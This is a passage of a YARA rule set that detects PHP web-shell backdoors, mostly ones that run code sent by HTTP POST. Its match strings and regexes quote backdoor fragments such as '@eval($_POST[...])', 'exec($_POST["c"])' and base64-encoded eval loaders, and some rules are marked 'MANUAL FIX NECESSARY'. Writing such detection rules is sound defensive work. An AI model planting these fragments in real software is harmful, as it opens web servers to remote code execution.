        $trigger = "if(isset($_POST[\"blah\"]) && md5($_POST[\"blah\"])"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR01851 : trigger
{
    strings:
        $ps0 = "\".chr("
    condition:
        $ps0
}

private rule PR01852 : trigger
{
    strings:
        $ps0 = ",chr("
    condition:
        $ps0
}

rule php_backdoor_eval_POST_090 : backdoor
{
    strings:
        $trigger = ").\"\\x"
        $php_backdoor_eval_POST_090_r0 = /<\?php[\s]*(\$[\w]+[\s]*=[\s]*\"[^;]+\.\"\\x[^\$]+;[\s]*)+\$[\w]+\(\$[\w]+,[\s]*\$[\w]+,[^;]+\)[\s]*\.[\s]*chr[^;]+\);[\s]*/
    condition:
        $trigger and PR01851 and PR01852 and $php_backdoor_eval_POST_090_r0
}

// MANUAL FIX NECESSARY
private rule PR01853 : trigger
{
    strings:
        $ps0 = ");}@"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_091 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_eval_POST_091_r0 = /<\?php function [\w]+\(\$\w,\$\w,\$\w.\$\w\)\{\$\w=\$\w[\{\[]\d+[\]\}]\.\$\w[\[\{]\d+[\]\}]\.[^;]+;\$\w=&\$\w;\$\w=&\$\w;\$\w=\$\w[\{\[][\d][^@]+;\}@[\w]+/
    condition:
        $trigger and PR01853 and $php_backdoor_eval_POST_091_r0
}

private rule PR01854 : trigger
{
    strings:
        $ps0 = "$GLOBALS"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_092 : backdoor
{
    strings:
        $trigger = ")]($_POST[\"content\"]));"
    condition:
        $trigger and PR01854 and PR00029
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_093 : backdoor
{
    strings:
        $trigger = "POST"
        $php_backdoor_eval_POST_093_r0 = /\]\(\$_COOKIE, \$_POST\) as \$\w+ => \$\w+\){function/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_POST_093_r0
}

rule php_backdoor_eval_POST_094 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"DZZHDqwIEkTv0qv/xQIovEa9wHtXeDYtvPee009dIJX"
    condition:
        $trigger
}

rule php_backdoor_eval_POST_095 : backdoor
{
    strings:
        $trigger = "=chr(99).chr(104).chr(114);"
    condition:
        $trigger
}

private rule PR01855 : trigger
{
    strings:
        $ps0 = "var_dump(md5("
    condition:
        $ps0
}

rule php_backdoor_eval_POST_096 : backdoor
{
    strings:
        $trigger = "stripslashes($_POST["
    condition:
        $trigger and PR01855 and PR01550
}

private rule PR01856 : trigger
{
    strings:
        $ps0 = "sprintf('%u"
    condition:
        $ps0
}

private rule PR01857 : trigger
{
    strings:
        $ps0 = "crc32($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_098 : backdoor
{
    strings:
        $trigger = "repeat_cmd"
    condition:
        $trigger and PR01856 and PR01857 and PR01693
}

private rule PR01858 : trigger
{
    strings:
        $ps0 = "|.*|e',);array_walk($arr, strval($_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_099 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR01858
}

// MANUAL FIX NECESSARY
private rule PR01859 : trigger
{
    strings:
        $ps0 = "if(!function_exists"
    condition:
        $ps0
}

private rule PR01860 : trigger
{
    strings:
        $ps0 = "= chr(ord($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_100 : backdoor
{
    strings:
        $trigger = "<strlen($"
        $php_backdoor_eval_POST_100_r0 = /if\(!function_exists\([^\{]+\{[\s]*function[^\}]+<strlen\(\$[\w]+\[\$[\w]+\]\);\$[\w]+\+\+\) \$[\w]+\[\$[\w]+\]\[\$[\w]+\] = chr\(ord\(\$/
    condition:
        $trigger and PR01859 and PR01860 and $php_backdoor_eval_POST_100_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_100_02 : backdoor
{
    strings:
        $trigger = "<strlen($"
        $php_backdoor_eval_POST_100_02_r0 = /<strlen\(\$[\w]+\[\$[\w]+\]\);\$[\w]+\+\+\) \$[\w]+\[\$[\w]+\]\[\$[\w]+\] = chr\(ord\(\$/
    condition:
        $trigger and PR01860 and $php_backdoor_eval_POST_100_02_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_102 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_eval_POST_102_r0 = /\}[\s]*\?>/
        $php_backdoor_eval_POST_102_r1 = /_POST\[['\"]\d{10,}['\"]\]/
        $php_backdoor_eval_POST_102_r2 = /<\?php[^>]{0,100}if[\s]*\(isset[^{]+\{[^\x02]{0,1500}\}[\s]*\?>/
    condition:
        $trigger and PR00397 and $php_backdoor_eval_POST_102_r0 and $php_backdoor_eval_POST_102_r1 and $php_backdoor_eval_POST_102_r2
}

private rule PR01861 : trigger
{
    strings:
        $ps0 = "eval($_POST["
    condition:
        $ps0
}

private rule PR01862 : trigger
{
    strings:
        $ps0 = "efine('SECURE_AUTH_SALT',"
    condition:
        $ps0
}

private rule PR01863 : trigger
{
    strings:
        $ps0 = "/** The name of the database for WordPress */"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_103 : backdoor
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR01861 and PR01862 and PR01863
}

rule php_backdoor_eval_POST_104 : backdoor
{
    strings:
        $trigger = "24T677871Y716Bd7K4203d2G041Y7R2726Q179282N77Z661I6E4667J6"
    condition:
        $trigger and PR01637
}

rule php_backdoor_eval_POST_105 : backdoor
{
    strings:
        $trigger = "){echo \"200\"; exit;} if(isset($_POST["
    condition:
        $trigger
}

private rule PR01864 : trigger
{
    strings:
        $ps0 = "preg_replace(\"/^/e\",$_(\"ZXZ"
    condition:
        $ps0
}

private rule PR01865 : trigger
{
    strings:
        $ps0 = "$_=\"b"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_106 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01864 and PR01865
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_107 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_eval_POST_107_r0 = /\$[\w]=[asert'\.]{6,};[\s]*\$[\w]=['\.eval]{4,};[\s]*@\$[\w]\(.\$[\w]\(.\$_POST/
    condition:
        $trigger and $php_backdoor_eval_POST_107_r0
}

// MANUAL FIX NECESSARY
private rule PR01866 : trigger
{
    strings:
        $ps0 = "]:@$_POST[$"
    condition:
        $ps0
}

private rule PR01867 : trigger
{
    strings:
        $ps0 = "l__"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_108 : backdoor
{
    strings:
        $trigger = "eval"
        $php_backdoor_eval_POST_108_r0 = /l__[\d\(]\(_[\w]+\([\d]+\)\)[\s]*\.[\s]*l__[\d\(]\(_[\w]+\([\d]+\)\)/
    condition:
        $trigger and PR01866 and PR00391 and PR01465 and PR01867 and $php_backdoor_eval_POST_108_r0
}

private rule PR01868 : trigger
{
    strings:
        $ps0 = "= '_POST';$"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_109 : backdoor
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR01868
}

rule php_backdoor_eval_POST_110 : backdoor
{
    strings:
        $trigger = "2T46Ub71A79K7E92K0Q3dX204172G7261792Q827616E8M69A6X471T6S62"
    condition:
        $trigger and PR00029
}

private rule PR01869 : trigger
{
    strings:
        $ps0 = "\"; create_function('', \""
    condition:
        $ps0
}

private rule PR01870 : trigger
{
    strings:
        $ps0 = "$cookey"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_111 : backdoor
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR01869 and PR01870
}

rule php_backdoor_eval_POST_113 : backdoor
{
    strings:
        $trigger = "@eval($_POST[admins]"
    condition:
        $trigger
}

private rule PR01871 : trigger
{
    strings:
        $ps0 = "PD9waHAgQGV2YWwoJF9QT1NUWy"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_114 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01871 and PR01415
}

private rule PR01872 : trigger
{
    strings:
        $ps0 = "2S4H79786d6D6E7W0203d204K17O2726T179282D7F726a6eJ72722S7T3Ld3e2D7R73"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_115 : backdoor
{
    strings:
        $trigger = "pack("
    condition:
        $trigger and PR01872
}

private rule PR01873 : trigger
{
    strings:
        $ps0 = "ICAgICRwcHJ0cyA9IHBhcnNlX3VybCgkdXJsKTsKICAgICAgICAgJHBfdXJsID0gImh0dHA6Ly8iLiRzcnZubS4kX1NFUlZFUlsi"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_116 : backdoor
{
    strings:
        $trigger = "\";eval("
    condition:
        $trigger and PR01873
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_117 : backdoor
{
    strings:
        $trigger = "base64_decod"
        $php_backdoor_eval_POST_117_r0 = /if[\s]*\(isset\(\$_POST\[.[\w].\]\)\)[\s]*\{[\s]*\$[\w][\s]*=[\s]*base64_decode\([^\)]+\.[^\)]+\)[^;]+;[\s]*@?\$[\w]\(\$_POST/
    condition:
        $trigger and PR01330 and $php_backdoor_eval_POST_117_r0
}

private rule PR01874 : trigger
{
    strings:
        $ps0 = "file_put_contents($_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $ps0
}

private rule PR01875 : trigger
{
    strings:
        $ps0 = "(!extension_loaded(\"openssl\")"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_118 : backdoor
{
    strings:
        $trigger = "openssl_cipher_iv_length($"
    condition:
        $trigger and PR01351 and PR01874 and PR01875
}

private rule PR01876 : trigger
{
    strings:
        $ps0 = "ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKaWYgKCRfR0VUWydxJ109PScxJyl7ZWNobyAnMjAw"
    condition:
        $ps0
}

private rule PR01877 : trigger
{
    strings:
        $ps0 = "echo base64"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_119 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01876 and PR01877
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_120 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_eval_POST_120_r0 = /function [\w]+[\s]*\(\$[\w]\)[\s]*\{[\s]*preg_replace_callback[\s]*\(.\|\|.[\s]*,[\s]*\$_POST\[.[\w].\][\s]*\([\s]*''[\s]*,[\s]*\$[\w]+->getMessage/
    condition:
        $trigger and PR00507 and $php_backdoor_eval_POST_120_r0
}

rule php_backdoor_eval_POST_121 : backdoor
{
    strings:
        $trigger = "};'.urldecode(gzinflate(urldecode($"
    condition:
        $trigger and PR01483
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_122 : backdoor
{
    strings:
        $trigger = "('',"
        $php_backdoor_eval_POST_122_r0 = /(\$[\w]+[\s]*=[\s]*'[^;]+'[\s]*\.[\s]*'[^;]+;[\s]*){3}\$[\w]+[\s]*=[\s]*@?\$[\w]+\('',[\s]*\$[\w]+\(\$[\w]+\('[^'\s]{1000}[^;]+;[\s]*\$[\w]+\(\);/
    condition:
        $trigger and $php_backdoor_eval_POST_122_r0
}

private rule PR01878 : trigger
{
    strings:
        $ps0 = "@urlencode(@base64_encode(@var_export($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_123 : backdoor
{
    strings:
        $trigger = "false){continue;}die('OK="
    condition:
        $trigger and PR00435 and PR01878
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_124 : backdoor
{
    strings:
        $trigger = "@eval($_POST["
        $php_backdoor_eval_POST_124_r0 = /<\?php[\s]{20,}@eval\(\$_POST\[[^\]]+\]\);/
    condition:
        $trigger and $php_backdoor_eval_POST_124_r0
}

rule php_backdoor_eval_POST_125 : backdoor
{
    strings:
        $trigger = "preg_replace(\"/./\\x65\",@$_POST["
    condition:
        $trigger and PR01490
}

rule php_backdoor_eval_POST_126 : backdoor
{
    strings:
        $trigger = "evals(@$_POST["
    condition:
        $trigger
}

private rule PR01879 : trigger
{
    strings:
        $ps0 = "$data['action']($data['args'],$data['args2']);"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_127 : backdoor
{
    strings:
        $trigger = "@unserialize(gzdecode(base64_decode($_POST[md5($_SERVER["
    condition:
        $trigger and PR01879
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_128 : backdoor
{
    strings:
        $trigger = "foreach($_POST"
        $php_backdoor_eval_POST_128_r0 = /<\?(php)?[\s]*foreach\(\$_POST as \$[\w]+[\s]*=>[\s]*\$[\w]+\)[\s]*\{[\s]*eval[\s]*\([\s]*base64_decode[\s]*\([\s]*\$[\w]+\)\);?[\s]*\}[\s]*(exit[^\n]+)?/
    condition:
        $trigger and PR01398 and $php_backdoor_eval_POST_128_r0
}

rule php_backdoor_eval_POST_129 : backdoor
{
    strings:
        $trigger = "aWYgKHN0cnBvcygkX1NFUlZFUlsnUkVRVUVTVF9VU"
    condition:
        $trigger and PR01398
}

// MANUAL FIX NECESSARY
private rule PR01880 : trigger
{
    strings:
        $ps0 = "\"-;-\";"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_130 : backdoor
{
    strings:
        $trigger = "__FILE__"
        $php_backdoor_eval_POST_130_r0 = /\"-;-\";[\s]*\$[\w]+[\s]*=[\s]*'[^']+';[\s]*\$[\w]+[\s]*=[\s]*(\$[\w]+\{[\d]+\}[\s]*\.[\s]*){5}/
    condition:
        $trigger and PR01880 and $php_backdoor_eval_POST_130_r0
}

private rule PR01881 : trigger
{
    strings:
        $ps0 = "->getPath();}}catch(Exception$"
    condition:
        $ps0
}

private rule PR01882 : trigger
{
    strings:
        $ps0 = "($_POST['e']));"
    condition:
        $ps0
}

private rule PR01883 : trigger
{
    strings:
        $ps0 = "='.png'){$"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_131 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01881 and PR01882 and PR01883 and PR01021
}

private rule PR01884 : trigger
{
    strings:
        $ps0 = "if(isset($_GET[$p1]) || isset($_POST[$p1])"
    condition:
        $ps0
}

private rule PR01885 : trigger
{
    strings:
        $ps0 = "$_POST[$p1]=$_POST[$p2];"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_132 : backdoor
{
    strings:
        $trigger = "while($i<"
    condition:
        $trigger and PR01884 and PR01885
}

private rule PR01886 : trigger
{
    strings:
        $ps0 = "wp_sum_check($debugger_binary_x86_x64)"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_133 : backdoor
{
    strings:
        $trigger = "define"
    condition:
        $trigger and PR01886
}

private rule PR01887 : trigger
{
    strings:
        $ps0 = "str_replace('!@#$%',\"'\",urldecode("
    condition:
        $ps0
}

rule php_backdoor_eval_POST_134 : backdoor
{
    strings:
        $trigger = "%3C%3F%70%68%70%20%0D%0A%2F%2A%0D%0A%0D%0A%4F"
    condition:
        $trigger and PR01887 and PR00265 and PR01362
}

private rule PR01888 : trigger
{
    strings:
        $ps0 = "{echo '200';"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_135 : backdoor
{
    strings:
        $trigger = "register_shutdown_function($c('', $f($_POST["
    condition:
        $trigger and PR01888
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_136 : backdoor
{
    strings:
        $trigger = "base64_decode($_POST["
        $php_backdoor_eval_POST_136_r0 = /<\?php[\s]*eval[\s]*\([\s]*base64_decode[\s]*\(\$_POST\[.[\w]+.\][\s]*\)[\s]*\)[\s]*;/
    condition:
        $trigger and $php_backdoor_eval_POST_136_r0
}

private rule PR01889 : trigger
{
    strings:
        $ps0 = "(isset($_POST[\"code\"]) && @_isAuth())"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_137 : backdoor
{
    strings:
        $trigger = "(@md5($_POST[\"key\"]) == HASH_KEY)"
    condition:
        $trigger and PR01889 and PR01351
}

private rule PR01890 : trigger
{
    strings:
        $ps0 = "(strrev(\"/+./\"),"
    condition:
        $ps0
}

private rule PR01891 : trigger
{
    strings:
        $ps0 = "strrev(implode(\"\", array("
    condition:
        $ps0
}

rule php_backdoor_eval_POST_138 : backdoor
{
    strings:
        $trigger = "strrev(\"\\x6b\" . \"\\x63\" . \"\\x61\" . \"\\x62\""
    condition:
        $trigger and PR01350 and PR01890 and PR01891
}

rule php_backdoor_eval_POST_139 : backdoor
{
    strings:
        $trigger = "(strrev(\"/+./\"), function ($"
    condition:
        $trigger and PR01350 and PR01891
}

private rule PR01892 : trigger
{
    strings:
        $ps0 = "copy('http"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_140 : backdoor
{
    strings:
        $trigger = "@eval($_POST["
    condition:
        $trigger and PR01783 and PR01892
}

private rule PR01893 : trigger
{
    strings:
        $ps0 = "ZXZhbCgk"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_141 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01893 and PR01353
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_142 : backdoor
{
    strings:
        $trigger = "@eval($_POST["
        $php_backdoor_eval_POST_142_r0 = /@pack\(\"H\*\",[\s]*\$[\w]+\);[\s]*\$_POST\[\$[\w]+\]=@pack\(\"H\*\",[\s]*\$[\w]+\);/
    condition:
        $trigger and $php_backdoor_eval_POST_142_r0
}

private rule PR01894 : trigger
{
    strings:
        $ps0 = "=str_replace('','',$_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_143 : backdoor
{
    strings:
        $trigger = "eval(\"\\\"$"
    condition:
        $trigger and PR01894
}

private rule PR01895 : trigger
{
    strings:
        $ps0 = "QHNlc3Npb25fc3RhcnQoKTtpZihpc3Nld"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_144 : backdoor
{
    strings:
        $trigger = "('',"
    condition:
        $trigger and PR01895
}

// MANUAL FIX NECESSARY
private rule PR01896 : trigger
{
    strings:
        $ps0 = "   +   "
    condition:
        $ps0
}

rule php_backdoor_eval_POST_145 : backdoor
{
    strings:
        $trigger = ">"
        $php_backdoor_eval_POST_145_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*\"[^\"]+\";[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\[.[\s]*[\w]+[\s]{3,}.[\s]{3,}\+[\s]{3,}[\d]+[\s]{3,}\+[^\}]+\$[\w]+[\s]*=[\s]*[\d]+;[\s]*\?>/
    condition:
        $trigger and PR01896 and $php_backdoor_eval_POST_145_r0
}

private rule PR01897 : trigger
{
    strings:
        $ps0 = "if(sizeof($_GET)<"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_146 : backdoor
{
    strings:
        $trigger = "@eval($"
    condition:
        $trigger and PR01897 and PR01422 and PR01788
}

rule php_backdoor_eval_POST_147 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(substr($_POST"
    condition:
        $trigger
}

private rule PR01898 : trigger
{
    strings:
        $ps0 = "@mkdir($this->options['doc_root'].'/wp-content/uploads"
    condition:
        $ps0
}

private rule PR01899 : trigger
{
    strings:
        $ps0 = "!file_exists($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_148 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR01898 and PR01899
}

// MANUAL FIX NECESSARY
private rule PR01900 : trigger
{
    strings:
        $ps0 = "// Set the platform root path as a constant if necessary."
    condition:
        $ps0
}

private rule PR01901 : trigger
{
    strings:
        $ps0 = "GNU General Public License version 2 or later"
    condition:
        $ps0
}

private rule PR01902 : trigger
{
    strings:
        $ps0 = "'PATH'"
    condition:
        $ps0
}

private rule PR01903 : trigger
{
    strings:
        $ps0 = "__DIR__"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_149 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_eval_POST_149_r0 = /\/\/ [^\s]{10}/
        $php_backdoor_eval_POST_149_r1 = /__DIR__[\s]*\)[\s]*;[\s]*\}[\s]*\/\/[^\}]+exit[\s]*;[\s]*\}/
    condition:
        $trigger and PR01900 and PR01901 and PR01902 and PR01903 and $php_backdoor_eval_POST_149_r0 and $php_backdoor_eval_POST_149_r1
}

// MANUAL FIX NECESSARY
private rule PR01904 : trigger
{
    strings:
        $ps0 = "TEMP END"
    condition:
        $ps0
}

private rule PR01905 : trigger
{
    strings:
        $ps0 = "(!empty($_REQUEST))"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_149_02 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_eval_POST_149_02_r0 = /\/\/ [^\s]{10}/
    condition:
        $trigger and PR01900 and PR01901 and PR01904 and PR01902 and PR01905 and PR01903 and $php_backdoor_eval_POST_149_02_r0
}

private rule PR01906 : trigger
{
    strings:
        $ps0 = "].reset(get_defined_vars()["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_150 : backdoor
{
    strings:
        $trigger = "\"\";eval($"
    condition:
        $trigger and PR00507 and PR01906
}

rule php_backdoor_eval_POST_151 : backdoor
{
    strings:
        $trigger = ")){$js($_POST["
    condition:
        $trigger and PR00029 and PR01785
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_153 : backdoor
{
    strings:
        $trigger = "= base64_decode($_POST["
        $php_backdoor_eval_POST_153_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*base64_decode\(\$_POST\[.[\w]+.\]\);[\s]*eval\(\$[\w]+\);/
    condition:
        $trigger and PR01350 and $php_backdoor_eval_POST_153_r0
}

private rule PR01907 : trigger
{
    strings:
        $ps0 = "return explode('::', $"
    condition:
        $ps0
}

private rule PR01908 : trigger
{
    strings:
        $ps0 = "]) ^ ord($"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_154 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR01907 and PR01908 and PR00397
}

rule php_backdoor_eval_POST_155 : backdoor
{
    strings:
        $trigger = "@eval(\"$this->"
    condition:
        $trigger and PR00507
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_156 : backdoor
{
    strings:
        $trigger = "($_POST["
        $php_backdoor_eval_POST_156_r0 = /@eval[\s]*\(base64_decode\(substr\(\$_POST\[/
    condition:
        $trigger and $php_backdoor_eval_POST_156_r0
}

private rule PR01909 : trigger
{
    strings:
        $ps0 = "fopen(dirname(__FILE__)"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_157 : backdoor
{
    strings:
        $trigger = "%3C%3F%70%68%70%20%0D%0A%2F%2A%0D%0A%57%6F%72"
    condition:
        $trigger and PR01362 and PR01909
}

private rule PR01910 : trigger
{
    strings:
        $ps0 = "<title>404 Page Not Found</title>"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_158 : backdoor
{
    strings:
        $trigger = "]) > 0 and isset($_POST[$"
    condition:
        $trigger and PR01410 and PR01910
}

private rule PR01911 : trigger
{
    strings:
        $ps0 = "mainerror\"];$mb64"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_159 : backdoor
{
    strings:
        $trigger = "eval($mb64($gg));"
    condition:
        $trigger and PR00507 and PR01911
}

rule php_backdoor_eval_POST_159_02 : backdoor
{
    strings:
        $trigger = "die(mainerror());"
    condition:
        $trigger and PR00029 and PR00507 and PR01911
}

rule php_backdoor_eval_POST_160 : backdoor
{
    strings:
        $trigger = "$fun = create_function('',$_POST['a']);"
    condition:
        $trigger
}

private rule PR01912 : trigger
{
    strings:
        $ps0 = "eval($_POST['"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_161 : backdoor
{
    strings:
        $trigger = "use Magento\\Framework\\Autoload\\AutoloaderRegistry;"
    condition:
        $trigger and PR01912
}

private rule PR01913 : trigger
{
    strings:
        $ps0 = "md5(\\\"$_SERVER[SERVER_NAME]\\\".__FILE__)"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_162 : backdoor
{
    strings:
        $trigger = ";if(@file_put_contents(${$"
    condition:
        $trigger and PR01913 and PR01351
}

private rule PR01914 : trigger
{
    strings:
        $ps0 = "IEBldmFsKCRfUE9TVFs"
    condition:
        $ps0
}

private rule PR01915 : trigger
{
    strings:
        $ps0 = "return @$"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_163 : backdoor
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR01914 and PR01915
}

private rule PR01916 : trigger
{
    strings:
        $ps0 = "@$_cmd=$_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_164 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR01916
}

private rule PR01917 : trigger
{
    strings:
        $ps0 = "function bypass(){"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_166 : backdoor
{
    strings:
        $trigger = "\".bypass().\""
    condition:
        $trigger and PR00029 and PR00507 and PR01917
}

private rule PR01918 : trigger
{
    strings:
        $ps0 = "return \"l(\\$_POST["
    condition:
        $ps0
}

rule php_backdoor_eval_POST_167 : backdoor
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR01918
}

private rule PR01919 : trigger
{
    strings:
        $ps0 = ",$_POST,'color');"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_168 : backdoor
{
    strings:
        $trigger = "require_once($wp['footer']);"
    condition:
        $trigger and PR01919 and PR00397
}

rule php_backdoor_eval_POST_169 : backdoor
{
    strings:
        $trigger = "array(\"n;}$_POST[args];/*\"=>\"test\")"
    condition:
        $trigger and PR01483
}

rule php_backdoor_eval_POST_170 : backdoor
{
    strings:
        $trigger = "$arr = array($_POST['pass'] => '|.*|e',);"
    condition:
        $trigger
}

private rule PR01920 : trigger
{
    strings:
        $ps0 = "(stripslashes($cmd"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_171 : backdoor
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR01330 and PR01920
}

private rule PR01921 : trigger
{
    strings:
        $ps0 = "('', @base64_decode('aWYoaXNzZXQoJF9QT1NUW3Byb2R1Y3RfaWRdKSAmJiBtZDUoJF9QT1N"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_172 : backdoor
{
    strings:
        $trigger = "=@base64_decode('Y3JlYXRlX2Z1bmN0aW9u');"
    condition:
        $trigger and PR01921
}

private rule PR01922 : trigger
{
    strings:
        $ps0 = "echo exec($_POST[\"c\"],$out); echo json_encode($out);"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_173 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01922
}

private rule PR01923 : trigger
{
    strings:
        $ps0 = "'P' . 'O' . 'S' . 'T'"
    condition:
        $ps0
}

private rule PR01924 : trigger
{
    strings:
        $ps0 = "'b' . 'a' . 's' . 'e' . '6' . '4'"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_174 : backdoor
{
    strings:
        $trigger = "eval("
    condition:
        $trigger and PR01480 and PR01923 and PR01924
}

private rule PR01925 : trigger
{
    strings:
        $ps0 = "=@base64_decode('Y3JlYXRlX2Z1bmN0aW9u');"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_175 : backdoor
{
    strings:
        $trigger = "IGV2YWwoYmFzZTY0X2RlY29kZSg"
    condition:
        $trigger and PR01925
}

private rule PR01926 : trigger
{
    strings:
        $ps0 = "ZDUoJF9QT1NUW3"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_176 : backdoor
{
    strings:
        $trigger = "=@base64_decode('Y3JlYXRlX2Z1bmN0aW9u');"
    condition:
        $trigger and PR01926
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_177 : backdoor
{
    strings:
        $trigger = "].$"
        $php_backdoor_eval_POST_177_r0 = /\$[\w]+\[[\d]+\]+[\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\.[\s]*\$[\w]+\[[\d]+\][\s]*\./
        $php_backdoor_eval_POST_177_r1 = /\$[\w]+=[^;]+;\$[\w]+=\$[\w]+\[[\d]*\]\.[^@]+;if\(\@\$[\w]+\(\$[\w]+\)\)\{\$[\w]+[\s]*=[\s]*@\$[\w]+\([^\}]+\)\);@\$[\w]+\(\);\}/
    condition:
        $trigger and $php_backdoor_eval_POST_177_r0 and $php_backdoor_eval_POST_177_r1
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_POST_178 : backdoor
{
    strings:
        $trigger = "@str_replace('@set_magic_quotes_runtime(0);','',@base64_decode(@"
        $php_backdoor_eval_POST_178_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_POST_178_r0
}

private rule PR01927 : trigger
{
    strings:
        $ps0 = "mkdir($shareFolder);"
    condition:
        $ps0
}

private rule PR01928 : trigger
{
    strings:
        $ps0 = "eval($decrypted_code);"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_179 : backdoor
{
    strings:
        $trigger = "echo '"
    condition:
        $trigger and PR01927 and PR00507 and PR01928
}

rule php_backdoor_eval_POST_180 : backdoor
{
    strings:
        $trigger = "])){@preg_replace("
    condition:
        $trigger and PR01735 and PR01490
}

private rule PR01929 : trigger
{
    strings:
        $ps0 = "array_merge($_COOKIE, $_POST);"
    condition:
        $ps0
}

rule php_backdoor_eval_POST_181 : backdoor
{
    strings:
        $trigger = "=> @phpversion(),"
    condition:
        $trigger and PR01929 and PR00397
}

rule php_backdoor_eval_POST_182 : backdoor
{
    strings:
        $trigger = "eval"
    condition:
        $trigger and PR01929 and PR01653 and PR01422
}

// MANUAL FIX NECESSARY
private rule PR01930 : trigger
{
    strings:
        $ps0 = "=${$"
    condition:
        $ps0
}

private rule PR01931 : trigger
{
    strings:
        $ps0 = "[4].$"
    condition:
        $ps0
}

private rule PR01932 : trigger
{
    strings:
        $ps0 = "<?php $"
